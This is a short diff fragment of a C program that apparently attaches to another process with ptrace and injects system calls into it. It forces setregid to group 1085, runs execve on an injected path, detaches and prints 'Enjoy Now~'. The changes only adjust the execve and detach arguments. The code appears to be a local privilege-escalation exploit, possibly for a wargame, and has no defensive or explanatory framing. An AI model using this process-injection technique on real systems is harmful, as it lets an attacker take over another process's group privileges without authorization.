@@ -70,7 +70,7 @@ int pt_syscall(pid_t pid, int sysno, int arg0, int arg1, int arg2, int arg3, int
 
 void pt_execve(pid_t pid) {
     puts("execve");
-    pt_syscall(pid, SYS_execve, ADDR_STR, _argv, 0, 0, 0, 0);
+    pt_syscall(pid, SYS_execve, ADDR_STR, 0, 0, 0, 0, 0);
 }
 
 void pt_setregid(pid_t pid, int rgid, int egid) {
@@ -114,12 +114,12 @@ int main(int argc, char** argv, char** envp) {
             pt_setregid(pid, 1085, 1085);
             show_gids(pid);
             pt_execve(pid);
-            if (0 > ptrace(PTRACE_DETACH, pid, 0, &regs)) {
+            if (0 > ptrace(PTRACE_DETACH, pid, 0, 0)) {
                 perror("PTRACE_DETACH failed.");
                 continue;
             }
-            // if (wait_child(pid))
             wait_child(pid);
+            // if (wait_child(pid))
             puts("Enjoy Now~");
             exit(0);
         } else {
